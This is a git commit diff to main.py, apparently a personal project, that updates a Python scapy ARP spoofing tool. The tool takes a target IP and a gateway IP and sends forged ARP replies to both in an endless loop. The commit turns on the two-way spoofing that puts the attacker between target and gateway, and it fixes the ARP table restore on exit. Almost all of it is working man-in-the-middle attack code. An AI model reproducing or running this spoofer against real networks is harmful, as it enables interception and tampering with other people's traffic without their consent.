97228ac2b321bd261437ff9845a32d034010bff3
John Hutchinson <john.d.hutchinson@outlook.com>
2021-12-04 16:47:44 -0500

    Added additional documentation and initial testing looks like this is working

--- main.py
+++ main.py
@@ -13,14 +13,13 @@ import time
 
 def get_arguments():
     parser = argparse.ArgumentParser()
-    # documentation must make clear that program must run with arguments.
     parser.add_argument("-t", "--target", dest="target", help="used for setting the target IP address")
     parser.add_argument("-g", "--gateway", dest="gateway", help="used for setting the spoofed gateway IP address")
     return parser.parse_args()
-# get_mac function required for getting MAC address of a network device
 
 
 def get_mac(ip):
+    # pdst is where ARP packets should go, i.e., the target
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast / arp_request
@@ -29,14 +28,16 @@ def get_mac(ip):
 
 
 def spoof(target, gateway):
+    # pdst is where ARP packets should go, i.e., the target
+    # hwdst is the destination hardware address
     packet = scapy.ARP(op=2, pdst=target, hwdst=get_mac(target), psrc=gateway)
     scapy.send(packet, verbose=False)
 
 
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
-    #source_mac = get_mac(source_ip)
-    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip) # removed hwsrc=source_mac
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, verbose=False)
 
 
@@ -52,18 +53,13 @@ def main():
     else:
         target = arguments.target
         gateway = arguments.gateway
-        #gateway = scapy.conf.route.route("0.0.0.0")[2]
-        """
-        print(f"The target is {target}")
-        print(f"The gateway is {gateway}")
-        """
         try:
             sent_packets_count = 0
             while True:
                 spoof(target, gateway)
-                #spoof(gateway, target)
+                spoof(gateway, target)
                 sent_packets_count = sent_packets_count + 2
-                print("\r[*] Packets Sent "+str(sent_packets_count), end = "")
+                print("\r[*] Packets Sent " + str(sent_packets_count), end="")
                 time.sleep(2)
         except KeyboardInterrupt:
             print("\nCtrl + C pressed.............Exiting")
